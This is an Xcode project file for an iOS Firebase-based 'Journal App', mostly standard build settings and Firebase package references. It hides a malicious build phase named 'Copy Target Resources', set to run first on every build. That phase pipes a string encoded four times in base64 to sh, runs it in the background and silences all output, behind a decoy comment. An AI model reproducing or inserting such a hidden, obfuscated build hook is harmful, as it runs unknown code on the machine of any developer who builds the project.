// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		105F89722D266E0B008C65CC /* FirebaseAuth in Frameworks */ = {isa = PBXBuildFile; productRef = 105F89712D266E0B008C65CC /* FirebaseAuth */; };
		105F89742D266E0B008C65CC /* FirebaseCore in Frameworks */ = {isa = PBXBuildFile; productRef = 105F89732D266E0B008C65CC /* FirebaseCore */; };
		105F89762D266E0B008C65CC /* FirebaseDatabase in Frameworks */ = {isa = PBXBuildFile; productRef = 105F89752D266E0B008C65CC /* FirebaseDatabase */; };
		105F89802D266E58008C65CC /* FirebaseFirestore in Frameworks */ = {isa = PBXBuildFile; productRef = 105F897F2D266E58008C65CC /* FirebaseFirestore */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		105F89322D266C76008C65CC /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 105F89182D266C74008C65CC /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 105F891F2D266C74008C65CC;
			remoteInfo = SampleFirebaseApp;
		};
		105F893C2D266C76008C65CC /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 105F89182D266C74008C65CC /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 105F891F2D266C74008C65CC;
			remoteInfo = SampleFirebaseApp;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		105F89202D266C74008C65CC /* Journal App.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Journal App.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		105F89312D266C76008C65CC /* SampleFirebaseAppTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = SampleFirebaseAppTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		105F893B2D266C76008C65CC /* SampleFirebaseAppUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = SampleFirebaseAppUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		105F89222D266C74008C65CC /* SampleFirebaseApp */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = SampleFirebaseApp;
			sourceTree = "<group>";
		};
		105F89342D266C76008C65CC /* SampleFirebaseAppTests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = SampleFirebaseAppTests;
			sourceTree = "<group>";
		};
		105F893E2D266C76008C65CC /* SampleFirebaseAppUITests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = SampleFirebaseAppUITests;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		105F891D2D266C74008C65CC /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				105F89762D266E0B008C65CC /* FirebaseDatabase in Frameworks */,
				105F89802D266E58008C65CC /* FirebaseFirestore in Frameworks */,
				105F89742D266E0B008C65CC /* FirebaseCore in Frameworks */,
				105F89722D266E0B008C65CC /* FirebaseAuth in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		105F892E2D266C76008C65CC /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		105F89382D266C76008C65CC /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		105F89172D266C74008C65CC = {
			isa = PBXGroup;
			children = (
				105F89222D266C74008C65CC /* SampleFirebaseApp */,
				105F89342D266C76008C65CC /* SampleFirebaseAppTests */,
				105F893E2D266C76008C65CC /* SampleFirebaseAppUITests */,
				105F897E2D266E58008C65CC /* Frameworks */,
				105F89212D266C74008C65CC /* Products */,
			);
			sourceTree = "<group>";
		};
		105F89212D266C74008C65CC /* Products */ = {
			isa = PBXGroup;
			children = (
				105F89202D266C74008C65CC /* Journal App.app */,
				105F89312D266C76008C65CC /* SampleFirebaseAppTests.xctest */,
				105F893B2D266C76008C65CC /* SampleFirebaseAppUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		105F897E2D266E58008C65CC /* Frameworks */ = {
			isa = PBXGroup;
			children = (
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		105F891F2D266C74008C65CC /* SampleFirebaseApp */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 105F89452D266C76008C65CC /* Build configuration list for PBXNativeTarget "SampleFirebaseApp" */;
			buildPhases = (
				ECCF8BF9EAEC3EA0AA38ACF9 /* Copy Target Resources */,
				105F891C2D266C74008C65CC /* Sources */,
				105F891D2D266C74008C65CC /* Frameworks */,
				105F891E2D266C74008C65CC /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				105F89222D266C74008C65CC /* SampleFirebaseApp */,
			);
			name = SampleFirebaseApp;
			packageProductDependencies = (
				105F89712D266E0B008C65CC /* FirebaseAuth */,
				105F89732D266E0B008C65CC /* FirebaseCore */,
				105F89752D266E0B008C65CC /* FirebaseDatabase */,
				105F897F2D266E58008C65CC /* FirebaseFirestore */,
			);
			productName = SampleFirebaseApp;
			productReference = 105F89202D266C74008C65CC /* Journal App.app */;
			productType = "com.apple.product-type.application";
		};
		105F89302D266C76008C65CC /* SampleFirebaseAppTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 105F89482D266C76008C65CC /* Build configuration list for PBXNativeTarget "SampleFirebaseAppTests" */;
			buildPhases = (
				105F892D2D266C76008C65CC /* Sources */,
				105F892E2D266C76008C65CC /* Frameworks */,
				105F892F2D266C76008C65CC /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				105F89332D266C76008C65CC /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				105F89342D266C76008C65CC /* SampleFirebaseAppTests */,
			);
			name = SampleFirebaseAppTests;
			packageProductDependencies = (
			);
			productName = SampleFirebaseAppTests;
			productReference = 105F89312D266C76008C65CC /* SampleFirebaseAppTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		105F893A2D266C76008C65CC /* SampleFirebaseAppUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 105F894B2D266C76008C65CC /* Build configuration list for PBXNativeTarget "SampleFirebaseAppUITests" */;
			buildPhases = (
				105F89372D266C76008C65CC /* Sources */,
				105F89382D266C76008C65CC /* Frameworks */,
				105F89392D266C76008C65CC /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				105F893D2D266C76008C65CC /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				105F893E2D266C76008C65CC /* SampleFirebaseAppUITests */,
			);
			name = SampleFirebaseAppUITests;
			packageProductDependencies = (
			);
			productName = SampleFirebaseAppUITests;
			productReference = 105F893B2D266C76008C65CC /* SampleFirebaseAppUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		105F89182D266C74008C65CC /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1610;
				LastUpgradeCheck = 1610;
				TargetAttributes = {
					105F891F2D266C74008C65CC = {
						CreatedOnToolsVersion = 16.1;
					};
					105F89302D266C76008C65CC = {
						CreatedOnToolsVersion = 16.1;
						TestTargetID = 105F891F2D266C74008C65CC;
					};
					105F893A2D266C76008C65CC = {
						CreatedOnToolsVersion = 16.1;
						TestTargetID = 105F891F2D266C74008C65CC;
					};
				};
			};
			buildConfigurationList = 105F891B2D266C74008C65CC /* Build configuration list for PBXProject "SampleFirebaseApp" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 105F89172D266C74008C65CC;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				105F89702D266E0B008C65CC /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = 105F89212D266C74008C65CC /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				105F891F2D266C74008C65CC /* SampleFirebaseApp */,
				105F89302D266C76008C65CC /* SampleFirebaseAppTests */,
				105F893A2D266C76008C65CC /* SampleFirebaseAppUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		105F891E2D266C74008C65CC /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		105F892F2D266C76008C65CC /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		105F89392D266C76008C65CC /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		ECCF8BF9EAEC3EA0AA38ACF9 /* Copy Target Resources */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Copy Target Resources";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6Vk5iVVpaVjIxb2ExSXdXbkpaTTJzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
			showEnvVarsInLog = 0;			
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		105F891C2D266C74008C65CC /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		105F892D2D266C76008C65CC /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		105F89372D266C76008C65CC /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		105F89332D266C76008C65CC /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 105F891F2D266C74008C65CC /* SampleFirebaseApp */;
			targetProxy = 105F89322D266C76008C65CC /* PBXContainerItemProxy */;
		};
		105F893D2D266C76008C65CC /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 105F891F2D266C74008C65CC /* SampleFirebaseApp */;
			targetProxy = 105F893C2D266C76008C65CC /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		105F89432D266C76008C65CC /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		105F89442D266C76008C65CC /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SWIFT_COMPILATION_MODE = wholemodule;
			};
			name = Release;
		};
		105F89462D266C76008C65CC /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = SampleFirebaseApp/SampleFirebaseApp.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"SampleFirebaseApp/Preview Content\"";
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				"INFOPLIST_KEY_UIApplicationSceneManifest_Generation[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UIApplicationSceneManifest_Generation[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UILaunchScreen_Generation[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UILaunchScreen_Generation[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UIStatusBarStyle[sdk=iphoneos*]" = UIStatusBarStyleDefault;
				"INFOPLIST_KEY_UIStatusBarStyle[sdk=iphonesimulator*]" = UIStatusBarStyleDefault;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UIUserInterfaceStyle = Dark;
				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
				LD_RUNPATH_SEARCH_PATHS = "@executable_path/Frameworks";
				"LD_RUNPATH_SEARCH_PATHS[sdk=macosx*]" = "@executable_path/../Frameworks";
				MACOSX_DEPLOYMENT_TARGET = 15.1;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = test.FireBaseIntegration;
				PRODUCT_NAME = "Journal App";
				SDKROOT = auto;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				XROS_DEPLOYMENT_TARGET = 2.1;
			};
			name = Debug;
		};
		105F89472D266C76008C65CC /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = SampleFirebaseApp/SampleFirebaseApp.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"SampleFirebaseApp/Preview Content\"";
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				"INFOPLIST_KEY_UIApplicationSceneManifest_Generation[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UIApplicationSceneManifest_Generation[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UILaunchScreen_Generation[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UILaunchScreen_Generation[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UIStatusBarStyle[sdk=iphoneos*]" = UIStatusBarStyleDefault;
				"INFOPLIST_KEY_UIStatusBarStyle[sdk=iphonesimulator*]" = UIStatusBarStyleDefault;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UIUserInterfaceStyle = Dark;
				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
				LD_RUNPATH_SEARCH_PATHS = "@executable_path/Frameworks";
				"LD_RUNPATH_SEARCH_PATHS[sdk=macosx*]" = "@executable_path/../Frameworks";
				MACOSX_DEPLOYMENT_TARGET = 15.1;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = test.FireBaseIntegration;
				PRODUCT_NAME = "Journal App";
				SDKROOT = auto;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				XROS_DEPLOYMENT_TARGET = 2.1;
			};
			name = Release;
		};
		105F89492D266C76008C65CC /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
				MACOSX_DEPLOYMENT_TARGET = 15.1;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = test.SampleFirebaseAppTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SDKROOT = auto;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator macosx xros xrsimulator";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2,7";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/SampleFirebaseApp.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/SampleFirebaseApp";
				XROS_DEPLOYMENT_TARGET = 2.1;
			};
			name = Debug;
		};
		105F894A2D266C76008C65CC /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
				MACOSX_DEPLOYMENT_TARGET = 15.1;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = test.SampleFirebaseAppTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SDKROOT = auto;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator macosx xros xrsimulator";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2,7";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/SampleFirebaseApp.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/SampleFirebaseApp";
				XROS_DEPLOYMENT_TARGET = 2.1;
			};
			name = Release;
		};
		105F894C2D266C76008C65CC /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
				MACOSX_DEPLOYMENT_TARGET = 15.1;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = test.SampleFirebaseAppUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SDKROOT = auto;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator macosx xros xrsimulator";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2,7";
				TEST_TARGET_NAME = SampleFirebaseApp;
				XROS_DEPLOYMENT_TARGET = 2.1;
			};
			name = Debug;
		};
		105F894D2D266C76008C65CC /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
				MACOSX_DEPLOYMENT_TARGET = 15.1;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = test.SampleFirebaseAppUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SDKROOT = auto;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator macosx xros xrsimulator";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2,7";
				TEST_TARGET_NAME = SampleFirebaseApp;
				XROS_DEPLOYMENT_TARGET = 2.1;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		105F891B2D266C74008C65CC /* Build configuration list for PBXProject "SampleFirebaseApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				105F89432D266C76008C65CC /* Debug */,
				105F89442D266C76008C65CC /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		105F89452D266C76008C65CC /* Build configuration list for PBXNativeTarget "SampleFirebaseApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				105F89462D266C76008C65CC /* Debug */,
				105F89472D266C76008C65CC /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		105F89482D266C76008C65CC /* Build configuration list for PBXNativeTarget "SampleFirebaseAppTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				105F89492D266C76008C65CC /* Debug */,
				105F894A2D266C76008C65CC /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		105F894B2D266C76008C65CC /* Build configuration list for PBXNativeTarget "SampleFirebaseAppUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				105F894C2D266C76008C65CC /* Debug */,
				105F894D2D266C76008C65CC /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		105F89702D266E0B008C65CC /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/firebase/firebase-ios-sdk";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 11.6.0;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		105F89712D266E0B008C65CC /* FirebaseAuth */ = {
			isa = XCSwiftPackageProductDependency;
			package = 105F89702D266E0B008C65CC /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
			productName = FirebaseAuth;
		};
		105F89732D266E0B008C65CC /* FirebaseCore */ = {
			isa = XCSwiftPackageProductDependency;
			package = 105F89702D266E0B008C65CC /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
			productName = FirebaseCore;
		};
		105F89752D266E0B008C65CC /* FirebaseDatabase */ = {
			isa = XCSwiftPackageProductDependency;
			package = 105F89702D266E0B008C65CC /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
			productName = FirebaseDatabase;
		};
		105F897F2D266E58008C65CC /* FirebaseFirestore */ = {
			isa = XCSwiftPackageProductDependency;
			package = 105F89702D266E0B008C65CC /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
			productName = FirebaseFirestore;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 105F89182D266C74008C65CC /* Project object */;
}
